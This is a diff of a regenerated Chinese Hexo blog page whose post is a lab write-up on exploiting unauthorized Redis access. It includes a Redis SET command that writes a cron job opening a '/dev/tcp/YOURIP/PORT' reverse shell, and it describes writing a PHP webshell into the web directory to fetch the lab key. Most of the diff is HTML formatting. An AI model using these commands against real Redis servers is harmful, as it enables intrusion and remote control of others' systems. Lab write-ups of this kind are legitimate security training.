@@ -15,10 +15,10 @@
 
 
 <html class="theme-next pisces use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 
 
@@ -32,8 +32,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -56,9 +56,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
@@ -129,10 +129,12 @@
 
 
 
+  <link rel="alternate" href="/atom.xml" title="Noel's Blog" type="application/atom+xml">
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/"/>
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/02/墨者学院-redis未授权访问/">
 
 
 
@@ -228,7 +230,7 @@
           
           <li class="menu-item menu-item-home">
     <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
   </li>
         
         
@@ -236,7 +238,7 @@
           
           <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
   </li>
         
         
@@ -244,7 +246,7 @@
           
           <li class="menu-item menu-item-categories">
     <a href="/categories/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
   </li>
         
         
@@ -252,7 +254,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
   </li>
 
       
@@ -368,7 +370,7 @@
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -396,11 +398,10 @@
 
           
             <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
+            <span class="post-meta-item-icon">
             <i class="fa fa-eye"></i>
              阅读次数： 
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
             </span>
           
 
@@ -432,21 +433,21 @@
 <p>先连接上Redis</p>
 <p>redis-cli -h 219.153.49.228 -p 40211</p>
 <p>结果在设置Redis的保存路径时就出现了错误</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/one.png" alt=""></p>
+<p><img src="/2018/10/02/墨者学院-redis未授权访问/one.png" alt></p>
 <p>换种方法试试</p>
 <h2 id="0x02-定时任务反弹Shell"><a href="#0x02-定时任务反弹Shell" class="headerlink" title="0x02 定时任务反弹Shell"></a>0x02 定时任务反弹Shell</h2><p>上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下</p>
 <p>把Redis保存文件设置为/var/spool/cron/root</p>
 <p>写入反弹shell的命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xxx <span class="string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n"</span></span><br></pre></td></tr></table></figure>
 <p>果然Save的时候出现错误</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/2.png" alt=""></p>
+<p><img src="/2018/10/02/墨者学院-redis未授权访问/2.png" alt></p>
 <h2 id="0x03-在Web目录下写入WebShell"><a href="#0x03-在Web目录下写入WebShell" class="headerlink" title="0x03 在Web目录下写入WebShell"></a>0x03 在Web目录下写入WebShell</h2><p>靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧</p>
 <p>先写一个PHP文件测试下</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/3.png" alt=""></p>
+<p><img src="/2018/10/02/墨者学院-redis未授权访问/3.png" alt></p>
 <p>访问<a href="http://219.153.49.228:44328/test.php,确实写进去东西了" target="_blank" rel="noopener">http://219.153.49.228:44328/test.php,确实写进去东西了</a></p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/4.png" alt=""></p>
+<p><img src="/2018/10/02/墨者学院-redis未授权访问/4.png" alt></p>
 <p>接下来就是写一句话，菜刀连接，拿到KEY</p>
-<p><img src="/2018/10/02/墨者学院-redis未授权访问/cat.png" alt=""></p>
+<p><img src="/2018/10/02/墨者学院-redis未授权访问/cat.png" alt></p>
 
       
     </div>
@@ -482,8 +483,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/01/sqlmap-tamper脚本编写/" rel="next" title="sqlmap --tamper脚本编写">
-                <i class="fa fa-chevron-left"></i> sqlmap --tamper脚本编写
+              <a href="/2018/10/02/Vulnhub-FristiLeaks/" rel="next" title="Vulnhub FristiLeaks">
+                <i class="fa fa-chevron-left"></i> Vulnhub FristiLeaks
               </a>
             
           </div>
@@ -492,8 +493,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/10/02/Vulnhub-FristiLeaks/" rel="prev" title="Vulnhub FristiLeaks">
-                Vulnhub FristiLeaks <i class="fa fa-chevron-right"></i>
+              <a href="/2018/10/02/hello-world/" rel="prev" title="Hello World">
+                Hello World <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -564,7 +565,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-count">40</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -603,7 +604,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -646,7 +651,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -654,6 +661,13 @@
             </nav>
           
 
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
           
 
           
@@ -725,7 +739,7 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
@@ -741,7 +755,7 @@
 
   <div class="powered-by"><!--
 <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>-->
-  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.8.0</div>
 
 
 
@@ -753,7 +767,7 @@
 
 
 
-
+</div>
         
 <div class="busuanzi-count">
   <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
@@ -922,5 +936,5 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
